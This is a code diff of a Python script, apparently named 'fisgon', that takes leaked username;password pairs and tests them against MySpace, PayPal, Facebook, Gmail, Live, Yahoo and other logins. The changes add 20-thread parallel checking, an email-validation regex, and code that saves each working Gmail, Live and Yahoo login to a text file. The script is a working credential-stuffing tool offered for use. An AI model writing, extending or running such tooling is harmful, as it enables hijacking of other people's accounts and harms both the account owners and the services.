@@ -10,32 +10,12 @@ import os
 import debug as Debug
 debug = Debug.debug
 
-from decoradores import Cache, Retry, Timeit
+from decoradores import Cache, Retry, Async, Verbose
 from threading import Thread
 
 RC = "%s/.fisgon/" % os.getenv("HOME")
+VERBOSE = 3
 
-import twill
-BrowserStateError = twill.browser.BrowserStateError
-
-class Async(Thread):
-    def __init__(self, func):
-        self.func = func
-        self.__name__ = func.func_name
-        Thread.__init__(self)
-        self.result = None
-    def __call__(self, *args, **kw):
-        self.args = args
-        self.kw = kw
-        self.start()
-        return self
-    def run(self, *args, **kw):
-        self.result = self.func(*self.args, **self.kw)
-    def get_result(self):
-        self.join()
-        return self.result
-       
-       
 
 class Discovers(list):
     def __call__(self, func):
@@ -44,12 +24,19 @@ class Discovers(list):
 
 discovers = Discovers()
 
+
 def ismail(user):
-    """De momento la expresión regular no funciona"""
-    return "@" in user
+    if re.search(
+        r"(^[-!#$%&'*+/=?^_`{}|~0-9A-Z]+(\.[-!#$%&'*+/=?^_`{}|~0-9A-Z]+)*"
+        r'|^"([\001-\010\013\014\016-\037!#-\[\]-\177]'
+        r'|\\[\001-011\013\014\016-\177])*"'
+        r')@(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?$',
+        user, re.IGNORECASE):
+        return True
+    else:
+        return False
 
 @discovers
-@Timeit
 @Cache(ruta=RC + "myspace.pickle")
 @Retry(15)
 def myspace(user, password):
@@ -73,7 +60,6 @@ def myspace(user, password):
         return False
 
 @discovers
-@Timeit
 @Cache(ruta=RC + "esdebian.pickle")
 @Retry(15)
 def esdebian(user, password):
@@ -97,7 +83,6 @@ def esdebian(user, password):
         return False
 
 @discovers
-@Timeit
 @Cache(ruta=RC + "paypal.pickle")
 @Retry(15)
 def paypal(user, password):
@@ -126,7 +111,6 @@ def paypal(user, password):
         return False
 
 @discovers
-@Timeit
 @Cache(ruta=RC + "facebook.pickle")
 @Retry(15)
 def facebook(user, password):
@@ -150,9 +134,10 @@ def facebook(user, password):
         return False
 
 @discovers
-@Timeit
+@Async
 @Cache(ruta=RC + "gmail.pickle")
 @Retry(15)
+@Verbose(VERBOSE)
 def gmail(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -172,12 +157,14 @@ def gmail(user, password):
             return None
     else:
         return False
+    write(";".join((user, password)), "gmail.txt")
     return "gmail.com"
 
 @discovers
-@Timeit
+@Async
 @Cache(ruta=RC + "live.pickle")
 @Retry(15)
+@Verbose(VERBOSE)
 def live(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -197,12 +184,14 @@ def live(user, password):
             return None
     else:
         return False
+    write(";".join((user, password)), "live.txt")
     return "live.com"
 
 @discovers
-@Timeit
+@Async
 @Cache(ruta=RC + "yahoo.pickle")
 @Retry(15)
+@Verbose(VERBOSE)
 def yahoo(user, password):
     if ismail(user) and "@yahoo." in user:
         smtp = smtplib.SMTP()
@@ -219,30 +208,45 @@ def yahoo(user, password):
             return None
     else:
         return False
+    write(";".join((user, password)), "yahoo.txt")
     return "yahoo.com"
+
+
+def write(text, destination):
+    f = open(destination, "a")
+    f.write("%s\n" % text)
+    f.close()
 
 
 def main():
     debug("FUN TIME!")
-    entrada = sys.stdin.readline()
-    while entrada:
-        Debug.INICIO = time.time()
-        u, p = entrada.strip().split(";")[:2]
-        u = u.lower()
+    entrada = sys.stdin.readlines()
 
-#        #Multi-tareas
-#        hilos = [Async(d) for d in discovers]
-#        funciones = [h(u, p) for h in hilos]
-#        resultados = [f.get_result() for f in funciones]
+    threads = 20
+    slots = [None] * threads
+    for line in entrada:
+        user, password = line.strip().split(";")[:2]
+        user = user.lower()
 
-        #Monotarea
-        resultados = [d(u, p) for d in discovers]
+        for discover in discovers:
+            if isinstance(discover, Async):
+                passed = False
+                while not passed:
+                    for pos in xrange(threads):
+                        if slots[pos] is None or not slots[pos].is_alive():
+                            slots[pos] = discover(user, password)
+                            passed = True
+                            break
+                    time.sleep(1)
 
-        resultados = [r for r in resultados if r]
-        debug("%s; %s; %s" % (u, p, str(resultados)))
-        print("%s;%s;%s" % (u, p, ",".join(resultados)))
-        sys.stdout.flush()
-        entrada = sys.stdin.readline()
+    for slot in slots:
+        if slot is not None:
+            slot.get_result()
+
+#        #Monotarea
+#        resultados = [d(user, password)
+#            for d in discovers if not isinstance(d, Async)]
+
     debug(">>> EOF !!")
 
 if __name__ == "__main__":
